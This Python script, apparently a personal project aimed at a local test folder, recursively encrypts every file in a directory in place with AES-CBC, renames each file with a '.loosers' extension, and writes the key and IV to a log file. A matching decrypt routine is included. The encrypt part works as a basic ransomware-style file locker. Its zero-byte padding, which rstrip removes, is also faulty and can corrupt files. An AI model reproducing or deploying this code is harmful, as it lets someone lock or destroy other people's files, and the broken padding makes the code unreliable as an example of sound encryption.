from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import hashlib
import os


class AES_Encrypt_File:

    def __init__(self, key, IV, path):
        self.key = key
        self.IV = IV
        mode = AES.MODE_CBC
        self.cipher = AES.new(key, mode, IV)
        self.path = path

    def pad_data(self, data):
        while len(data) % 16 != 0:
            data += b'0'
        return data

    def encrypt_doc(self, path, info):
        try:
            file = open(path, "rb")
            data = info + file.read()
            file.close()

            final_data = self.pad_data(data)
            encrypted_msg = self.cipher.encrypt(final_data)

            file = open(path, "wb")
            file.write(encrypted_msg)
            file.close()
            return True

        except Exception as error:
            print(error)
            return False

    def directory_looper(self):
        path_d = []
        extension = ".loosers"

        for directory in os.walk(self.path):
            path_d.append(directory)

        if len(path_d) == 0:
            file_name = self.path.rsplit("/", 1)[-1]

            if "." in file_name:
                ext = file_name.rsplit(".", 1)[-1]
            else:
                ext = "."

            info = bytes(ext + "?", "utf-8")
            value = self.encrypt_doc(self.path, info)
            if value:
                os.rename(self.path, self.path.rpartition('.')[0] + extension)

        else:
            for loop1 in range(len(path_d)):
                path_r, direc, file = path_d[loop1]

                for all_files in file:
                    file_path = path_r + "/" + all_files

                    if "." in all_files:
                        ext = all_files.rsplit(".", 1)[-1]
                    else:
                        ext = "."
                        all_files += "."

                    info = bytes(ext + "?", "utf-8")
                    value = self.encrypt_doc(file_path, info)
                    if value:
                        os.rename(file_path, path_r + "/" + all_files.rpartition('.')[0] + extension)

        print("\nCompleted")

    def main(self):
        logs = open("logs.txt", 'ab')
        logs.write(self.key + b'\n')
        logs.write(self.IV + b'\n')

        print(f'\nKey: {self.key}\nIV: {self.IV}')
        self.directory_looper()


class AES_Decrypt_File:

    def __init__(self, key, IV, path):
        self.key = key
        self.IV = IV
        mode = AES.MODE_CBC
        self.cipher = AES.new(key, mode, IV)
        self.path = path

    def decrypt_doc(self, path):
        try:
            file = open(path, "rb")
            data = file.read()
            file.close()

            decrypted_msg = self.cipher.decrypt(data)
            final_data = decrypted_msg.rstrip(b'0')

            content = final_data.split(b"?", 1)

            file = open(path, "wb")
            file.write(content[-1])
            file.close()

            if content[0] != ".":
                ext = b'.' + content[0]
            else:
                ext = b''

            os.rename(path, path.rpartition('.')[0] + ext.decode())

        except Exception as error:
            print(error)

    def directory_looper(self):
        path_d = []
        for directory in os.walk(self.path):
            path_d.append(directory)

        if len(path_d) == 0:
            self.decrypt_doc(self.path)

        else:
            for loop1 in range(len(path_d)):
                path_r, direc, file = path_d[loop1]

                for all_files in file:
                    file_path = path_r + "/" + all_files
                    self.decrypt_doc(file_path)

        print("\nCompleted")

    def main(self):
        self.directory_looper()


try:
    choice_type = int(input("1: Encrypt\n2: Decrypt\n\nChoice: "))
    if 0 < choice_type < 3 and choice_type == 1:

        path = "C:/Users/19026585.RP/Documents/Python/Python_Codes/Crypto/test"
        password = get_random_bytes(256)
        key = hashlib.sha256(password).digest()
        IV = get_random_bytes(16)

        AES_Encrypt_File(key, IV, path).main()

    elif 0 < choice_type < 3 and choice_type == 2:

        path = "C:/Users/19026585.RP/Documents/Python/Python_Codes/Crypto/test"
        logs = open("logs.txt", "rb")
        data = logs.readlines()[-2:]

        key = data[0][:-1]
        IV = data[-1][:-1]

        AES_Decrypt_File(key, IV, path).main()

    else:
        int("error")

except ValueError:
    print("Invalid Option. Exiting!")